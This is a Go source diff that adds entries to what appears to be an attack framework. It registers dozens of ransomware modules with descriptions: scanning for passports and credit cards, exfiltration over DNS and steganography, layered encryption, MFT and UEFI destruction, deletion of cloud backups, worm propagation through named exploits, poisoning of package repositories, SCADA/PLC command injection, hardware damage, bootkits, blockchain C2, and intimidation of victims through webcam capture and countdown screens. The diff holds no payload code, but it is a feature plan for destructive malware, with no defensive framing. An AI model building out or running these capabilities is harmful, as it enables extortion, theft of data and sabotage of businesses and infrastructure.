@@ -192,6 +192,43 @@ func (s *AppState) Start(ctx context.Context) error {
 			CVE: "CVE-2026-XXXX", Rank: "normal", OS: "Linux"},
 	)
 
+	// Ransomware modules (v2.3)
+	s.modules = append(s.modules,
+		ModuleDef{Name: "ransomware/execute", Type: "ransomware",
+			Description: "Full ransomware chain: scan sensitive data → exfil → multi-layer encrypt → destruct → propagate → psychological terror",
+			Rank: "danger", OS: "any"},
+		ModuleDef{Name: "ransomware/scan", Type: "ransomware",
+			Description: "Heuristic content scanner: DNI, passports, credit cards, contracts, PST/OST, MDF/SQL, API keys via regex engine",
+			Rank: "excellent", OS: "any"},
+		ModuleDef{Name: "ransomware/encrypt", Type: "ransomware",
+			Description: "Hydra multi-layer encryption: 3 RSA keys + Shamir's Secret Sharing + AES-GCM + ChaCha20 double encryption for critical files",
+			Rank: "danger", OS: "any"},
+		ModuleDef{Name: "ransomware/exfil", Type: "ransomware",
+			Description: "Double extortion: ZIP with password → exfil via DNS TXT fragments / CDN stego / S3 with stolen credentials",
+			Rank: "danger", OS: "any"},
+		ModuleDef{Name: "ransomware/note", Type: "ransomware",
+			Description: "Deploy ransom note + shaming post: .onion negotiation URL, data sample publishing, client notification",
+			Rank: "danger", OS: "any"},
+		ModuleDef{Name: "ransomware/destruct", Type: "ransomware",
+			Description: "System destruction: MFT overwrite, UEFI NVRAM sabotage, cloud backup API destruction (Veeam/Acronis/AWS)",
+			Rank: "danger", OS: "windows"},
+		ModuleDef{Name: "ransomware/propagate", Type: "ransomware",
+			Description: "Propagation via exploits: Zerologon, ProxyNotShell, PrintNightmare, BlueKeep, EternalBlue + Outlook COM + WSUS + NPM/Git poison",
+			Rank: "danger", OS: "any"},
+		ModuleDef{Name: "ransomware/psychological", Type: "ransomware",
+			Description: "Real-time terror: TOPMOST countdown window, webcam capture, printer spam, TTS audio threats, live file deletion",
+			Rank: "danger", OS: "any"},
+		ModuleDef{Name: "ransomware/polymorph", Type: "ransomware",
+			Description: "Binary polymorphism: JIT reordering, ROP gadget generation, per-machine key derivation, junk code insertion",
+			Rank: "great", OS: "any"},
+		ModuleDef{Name: "ransomware/trust_exploit", Type: "ransomware",
+			Description: "Trust exploitation: self-signed code cert generation, PFX/P12 search, WSUS/SCCM/NuGet/NPM/Git hook poisoning",
+			Rank: "danger", OS: "any"},
+		ModuleDef{Name: "ransomware/antianalysis", Type: "ransomware",
+			Description: "Anti-analysis: sandbox detection, kernel debugger check, PE corruption, stego C2 via CDN image LSB + EXIF",
+			Rank: "great", OS: "any"},
+	)
+
 	// Register agents
 	now := time.Now()
 	demoAgents := []types.Agent{
@@ -466,6 +503,27 @@ func (s *AppState) initModules() {
 		{Name: "auxiliary/worm_propagate", Type: "auxiliary", Description: "Wormy-ML network propagation", CVE: "", Rank: "great", OS: "any"},
 		{Name: "post/persist_cron", Type: "post", Description: "Cron job persistence installation", CVE: "", Rank: "great", OS: "Linux"},
 		{Name: "post/persist_systemd", Type: "post", Description: "Systemd service persistence installation", CVE: "", Rank: "great", OS: "Linux"},
+		// Block 1: Psychological & Reputation
+		{Name: "ransomware/hope_trap", Type: "ransomware", Description: "Partial decrypt trap + fake decryptor + forensic monitor trigger", CVE: "", Rank: "great", OS: "any"},
+		{Name: "ransomware/identity_destroy", Type: "ransomware", Description: "Steal browser sessions/cookies, hijack accounts, post humiliating content", CVE: "", Rank: "excellent", OS: "any"},
+		{Name: "ransomware/raas_inverse", Type: "ransomware", Description: "Inverse RaaS: invite attackers, multi-ransom notes, key distribution", CVE: "", Rank: "great", OS: "any"},
+		{Name: "ransomware/fake_decryptor", Type: "ransomware", Description: "Deploy fake decryptor that destroys remaining keys if forensic tools detected", CVE: "", Rank: "good", OS: "any"},
+		// Block 2: Pandemic Propagation
+		{Name: "ransomware/worm", Type: "ransomware", Description: "Multi-platform worm: Win/Linux/macOS/IoT propagation via SSH/SMB/exploits", CVE: "CVE-2017-17215", Rank: "excellent", OS: "any"},
+		{Name: "ransomware/supply_chain", Type: "ransomware", Description: "Poison software updaters, NuGet/pip/npm repos, git hooks, deploy fake patches", CVE: "", Rank: "great", OS: "any"},
+		{Name: "ransomware/cloud_exploit", Type: "ransomware", Description: "Harvest AWS/Azure/GCP creds, launch EC2 instances, create malicious AMIs, public S3 buckets", CVE: "", Rank: "excellent", OS: "any"},
+		{Name: "ransomware/bluetooth_prop", Type: "ransomware", Description: "BT/Wi-Fi Direct propagation: BlueBorne, BLE MITM, malicious APK push", CVE: "CVE-2021-30892", Rank: "good", OS: "any"},
+		{Name: "ransomware/iot_botnet", Type: "ransomware", Description: "IoT botnet: exploit cameras/routers/DVRs, DDoS capability", CVE: "CVE-2017-17215", Rank: "great", OS: "iot"},
+		// Block 3: Physical & Infrastructure Sabotage
+		{Name: "ransomware/scada_attack", Type: "ransomware", Description: "SCADA/PLC attack: Modbus/S7 command injection, overwrite ladder logic, stop PLCs", CVE: "", Rank: "excellent", OS: "any"},
+		{Name: "ransomware/hardware_kill", Type: "ransomware", Description: "Hardware destruction: overvoltage, fan kill, CPU burn loop, BIOS corruption", CVE: "", Rank: "great", OS: "any"},
+		{Name: "ransomware/network_poison", Type: "ransomware", Description: "ARP spoofing, MITM proxy, root CA install, SSL strip, captive portal", CVE: "", Rank: "great", OS: "any"},
+		// Block 4: Automutation & Resilience
+		{Name: "ransomware/dna_mutation", Type: "ransomware", Description: "DNA hybridize with legit DLLs, JIT mutate, ROP gadgets, junk code insertion", CVE: "", Rank: "great", OS: "any"},
+		{Name: "ransomware/bootkit", Type: "ransomware", Description: "MBR/GPT bootkit, disk write interception, SMART error fake, reinfection on restore", CVE: "", Rank: "excellent", OS: "any"},
+		{Name: "ransomware/blockchain_c2", Type: "ransomware", Description: "Blockchain C2 via Bitcoin OP_RETURN, immutable decentralized command channel", CVE: "", Rank: "great", OS: "any"},
+		// Bonus
+		{Name: "ransomware/survivor_game", Type: "ransomware", Description: "Survivor game: employees compete for decryption key, last standing wins", CVE: "", Rank: "great", OS: "any"},
 	}
 }
 
